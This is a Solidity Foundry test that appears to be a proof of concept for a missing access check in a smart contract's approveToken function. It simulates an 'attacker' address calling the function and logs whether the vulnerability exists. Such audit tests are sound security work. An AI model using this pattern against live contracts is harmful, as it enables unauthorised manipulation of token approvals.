// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract DemoTokenApprovalTest is Test {
    demo public tokenContract;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address dummyToken = address(0xDEAD);

    function setUp() public {
        vm.prank(owner);
        tokenContract = new demo();
    }

    function test_anyone_can_approve_tokens() public {
        console.log("\n--- BEFORE-Trigger approvedTokens ---");
        bool beforeApproval = tokenContract.approvedTokens(dummyToken);
        console.log("Approval status for dummyToken (Before):", beforeApproval);

        console.log("\n--- Trigger approveToken (by attacker) ---");
        vm.startPrank(attacker);
        (bool callSuccess, ) = address(tokenContract).call(
            abi.encodeWithSignature("approveToken(address)", dummyToken)
        );
        vm.stopPrank();
        console.log("Call result:", callSuccess ? "succeeded" : "reverted");

        console.log("\n--- AFTER-Trigger approvedTokens ---");
        bool afterApproval = tokenContract.approvedTokens(dummyToken);
        console.log("Approval status for dummyToken (After):", afterApproval);

        console.log("\n--- Verdict ---");
        if (callSuccess && !beforeApproval && afterApproval) {
            console.log("Vulnerability Exists: Non-owner successfully approved token");
        } else {
            if (!callSuccess) {
                console.log("Vulnerability not Exist: Call reverted (failed exploitation)");
            } else if (beforeApproval) {
                console.log("Vulnerability not Exist: Token already approved initially");
            } else if (!afterApproval) {
                console.log("Vulnerability not Exist: Approval status unchanged after call");
            }
        }
    }
}